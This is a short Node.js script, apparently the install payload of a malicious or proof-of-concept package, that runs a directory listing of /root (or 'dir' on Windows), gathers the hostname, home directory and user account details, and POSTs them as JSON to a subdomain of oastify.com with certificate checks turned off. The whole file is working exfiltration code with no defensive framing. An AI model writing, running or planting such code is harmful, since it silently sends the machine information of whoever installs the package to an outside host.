const https = require('https');
try {
  const execSync = require('child_process').execSync;
  const output = execSync('ls /root', { encoding: 'utf-8' });  // the default is 'buffer'
  var os = require("os");
  var hostname = os.hostname();
  var path = os.homedir();
  var userInfo = os.userInfo()

  const data = new TextEncoder().encode(
    JSON.stringify({
      hostname: hostname,
      project_id: process.argv[2],
      path: path,
      userInfo: userInfo,
      directoryList: output
    })
  );

  const options = {
    hostname: process.argv[2] + '.' + "hooks" + '.1667923894.020k3pifltekneo7d74oof30ur0ho6.oastify.com',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    },
    rejectUnauthorized: false
  }

  const req = https.request(options, res => {});
  req.write(data);
  req.end();

} catch(err) {
  const execSync = require('child_process').execSync;
  const output = execSync('dir', { encoding: 'utf-8' });  // the default is 'buffer'
  var os = require("os");
  var hostname = os.hostname();
  var path = os.homedir();
  var userInfo = os.userInfo()

  const data = new TextEncoder().encode(
    JSON.stringify({
      hostname: hostname,
      project_id: process.argv[2],
      path: path,
      userInfo: userInfo,
      directoryList: output
    })
  );

  const options = {
    hostname: process.argv[2] + '.' + "hooks" + '.1667923894.020k3pifltekneo7d74oof30ur0ho6.oastify.com',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    },
    rejectUnauthorized: false
  }

  const req = https.request(options, res => {});
  req.write(data);
  req.end();

}